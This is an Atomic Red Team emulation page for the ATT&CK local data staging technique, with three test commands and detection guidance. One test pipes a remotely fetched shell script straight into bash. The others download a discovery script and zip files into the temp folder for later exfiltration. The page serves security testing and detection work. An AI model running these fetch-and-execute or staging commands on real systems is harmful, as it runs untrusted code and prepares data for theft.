# T1074.001 - Data Staged: Local Data Staging
Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.

## Atomic Tests

#Import the Module before running the tests.
Import-Module /Users/0x6c/AtomicRedTeam/atomics/invoke-atomicredteam/Invoke-AtomicRedTeam.psd1 - Force

### Atomic Test #1 - Stage data from Discovery.bat
Utilize powershell to download discovery.bat and save to a local file. This emulates an attacker downloading data collection tools onto the host. Upon execution,
verify that the file is saved in the temp directory.

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.bat" -OutFile #{output_file}
```

Invoke-AtomicTest T1074.001 -TestNumbers 1

### Atomic Test #2 - Stage data from Discovery.sh
Utilize curl to download discovery.sh and execute a basic information gathering shell script

**Supported Platforms:** linux, macos
#### Attack Commands: Run with `bash`
```bash
curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh | bash -s > #{output_file}
```

Invoke-AtomicTest T1074.001 -TestNumbers 2

### Atomic Test #3 - Zip a Folder with PowerShell for Staging in Temp
Use living off the land tools to zip a file and stage it in the Windows temporary folder for later exfiltration. Upon execution, Verify that a zipped folder named Folder_to_zip.zip
was placed in the temp directory.

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
Compress-Archive -Path #{input_file} -DestinationPath #{output_file} -Force
```

Invoke-AtomicTest T1074.001 -TestNumbers 3

## Detection
Processes that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files, such as 7zip, RAR, ZIP, or zlib. Monitor publicly writeable directories, central locations, and commonly used staging directories (recycle bin, temp folders, etc.) to regularly check for compressed or encrypted data that may be indicative of staging.

Monitor processes and command-line arguments for actions that could be taken to collect and combine files. Remote access tools with built-in features may interact directly with the Windows API to gather and copy to a location. Data may also be acquired and staged through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).